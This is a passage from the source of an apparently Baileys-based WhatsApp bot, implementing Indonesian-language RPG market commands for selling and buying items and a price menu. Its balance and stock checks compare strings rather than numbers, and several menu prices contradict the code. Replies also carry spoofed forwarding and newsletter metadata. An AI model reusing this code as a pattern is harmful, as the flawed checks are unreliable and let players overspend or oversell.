        if (`${global.db.erpg[m.sender].kerbau}` < `${jumlh}`) return m.reply(`*Kerbau Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].kerbau -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Kerbau: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'monyet': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].monyet}` < `${jumlh}`) return m.reply(`*Monyet Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].monyet -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Monyet: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'babihutan': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].babihutan}` < `${jumlh}`) return m.reply(`*Babi Hutan Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].babihutan -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Babi Hutan: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'babi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].babi}` < `${jumlh}`) return m.reply(`*Babi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].babi -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Babi: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'limit': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 100)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].limit}` < `${jumlh}`) return m.reply(`*Limit Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        db.users[m.sender].limit -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Limit: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'glimit':
      case 'gamelimit': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 100)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].glimit}` < `${jumlh}`) return m.reply(`*Game Limit Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].glimit -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Game Limit: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'paus': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 78000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].paus}` < `${jumlh}`) return m.reply(`*Paus Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].paus -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Paus: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kepiting': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].kepiting}` < `${jumlh}`) return m.reply(`*Kepiting Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].kepiting -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Kepiting: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'gurita': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 3000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].gurita}` < `${jumlh}`) return m.reply(`*Gurita Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].gurita -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Gurita: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'cumi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].cumi}` < `${jumlh}`) return m.reply(`*Cumi Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].cumi -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Cumi: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'buntal': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].buntal}` < `${jumlh}`) return m.reply(`*Buntal Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].buntal -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Buntal: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'dory': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 7000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].dory}` < `${jumlh}`) return m.reply(`*Dory Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].dory -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Dory: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'lumba': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 67400)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].lumba}` < `${jumlh}`) return m.reply(`*Lumba" Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].lumba -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Lumba": ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'lobster': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 3000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].lobster}` < `${jumlh}`) return m.reply(`*Lobster Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].lobster -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Lobster: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'hiu': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 87500)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].hiu}` < `${jumlh}`) return m.reply(`*Hiu Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].hiu -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Hiu: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'udang': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].udang}` < `${jumlh}`) return m.reply(`*Udang Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].udang -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Udang: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'orca': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 12000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].orca}` < `${jumlh}`) return m.reply(`*Orca Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].orca -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Orca: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'potion': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${global.db.erpg[m.sender].potion}` < `${jumlh}`) return m.reply(`*Potion Kamu Tidak Cukup*`)
        db.users[m.sender].saldo += uang
        global.db.erpg[m.sender].potion -= parseInt(args[1])
        m.reply(`*MARKET - JUAL🛍️*

*Item Terjual:*
  ${vircion} • Potion: ${args[1]}

*Penghasilan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      default:
        let teks = `------- » *🛍️ MARKET 🛍️* « -------

*Users Items⚔*
  ${vircion} • rumah +Rp 2.000.000
  ${vircion} • potion +Rp 1.000
  ${vircion} • Limit: +Rp 1.000
  ${vircion} • GameLimit: +Rp 1.000
  ${vircion} • emas +Rp 20.500
  ${vircion} • besi +Rp 1.500
  ${vircion} • batubara +Rp 1.000
  ${vircion} • perak +Rp 2.000
  ${vircion} • kayu +Rp 500
  ${vircion} • emerald +Rp 20.000
  ${vircion} • diamond +Rp 50.000
  ${vircion} • botol +Rp 200
  ${vircion} • kardus +Rp 200
  ${vircion} • kaleng +Rp 200
  ${vircion} • gelas +Rp 200
  ${vircion} • plastik +Rp 200

*Hewan Darat🌿*
  ${vircion} • ayam +Rp 500
  ${vircion} • sapi +Rp 3.000
  ${vircion} • domba +Rp 2.000
  ${vircion} • banteng +Rp 30.000
  ${vircion} • gajah +Rp 70.000
  ${vircion} • harimau +Rp 100.000
  ${vircion} • kambing +Rp 30000
  ${vircion} • panda +Rp 40.000
  ${vircion} • buaya +Rp 20.000
  ${vircion} • kerbau +Rp 40.000
  ${vircion} • monyet +Rp 20.000
  ${vircion} • babihutan +Rp 40.000
  ${vircion} • babi +Rp 20.000

*Hewan Laut 🌊*
  ${vircion} • ikan +Rp 200
  ${vircion} • paus +Rp 78000500
  ${vircion} • kepiting +Rp 2000
  ${vircion} • gurita +Rp 3000
  ${vircion} • cumi +Rp 2000
  ${vircion} • buntal +Rp 1000
  ${vircion} • dory +Rp 7000
  ${vircion} • lumba +Rp 674000
  ${vircion} • lobster +Rp 3000
  ${vircion} • hiu +Rp 8750000
  ${vircion} • udang +Rp 1000
  ${vircion} • orca +Rp 12000
_____________________________

*Tutorials :*
➠ To Sell Items:
.sell [item] [quantity]
▧ Example:
.sell emas 10`
        sock.sendMessage(m.chat, {
          text: teks,
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: null + "@newsletter",
              serverMessageId: null,
              newsletterName: `${namaBot}`
            },
            externalAdReply: {
              title: "SELLING MARKET",
              body: 'Sell goods to earn money',
              thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
              sourceUrl: "-",
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      }
    }
    break

    case 'shop':
    case 'buy':
    case 'beli': {

if (setting.rpgsetStats) return m.reply('Fitur rpg dimatikan oleh owner')
      if (!global.db.erpg[m.sender].rpg) return m.reply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
      if (text.includes('-')) return m.reply('Nominal Tidak valid!!');
      let jual = args[0]
      switch (jual) {
      case 'emas': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20500)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].emas += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Emas: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'besi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1500)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].besi += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Besi: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'batubara': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 1000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].batubara += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Batu Bara: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'perak': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].perak += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Perak: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kayu': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 500)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].kayu += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Kayu: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'ayam': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 500)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].ayam += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Ayam: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'sapi': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 3000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].sapi += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Sapi: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'domba': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].domba += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Domba: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'ikan': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].ikan += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Ikan: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'rumah': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 2000000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].rumah += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • rumah: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'emerald': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 20000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].emerald += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Emerald: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'diamond': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 50000)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].diamond += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Diamond: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'botol': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].botol += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Botol: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kardus': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].kardus += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Kardus: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'kaleng': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].kaleng += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Kaleng: ${args[1]}

*Dibayarkan:*
  ${vircion} • Kaleng: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'gelas': {

if (!args[1]) return m.reply(`*Masukan Jumlahnya*\n\nContoh:\n${cmd} ${args[0]} 2`)
        if (isNaN(args[1])) return m.reply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${cmd} ${args[0]} 2`)
        let uang = Number(parseInt(args[1]) * 200)
        let jumlh = Number(args[1])
        if (`${db.users[m.sender].saldo}` < `${uang}`) return m.reply(`*Saldo Kamu Tidak Cukup*`)
        db.users[m.sender].saldo -= uang
        global.db.erpg[m.sender].gelas += parseInt(args[1])
        m.reply(`*MARKET - BELI🛍️*

*Item Dibeli:*
  ${vircion} • Gelas: ${args[1]}

*Dibayarkan:*
  ${vircion} • Saldo: ${uang}

*Sisa Uang:*
  ${vircion} • Saldo Total: ${db.users[m.sender].saldo}`)
      }
      break
      case 'plastik': {

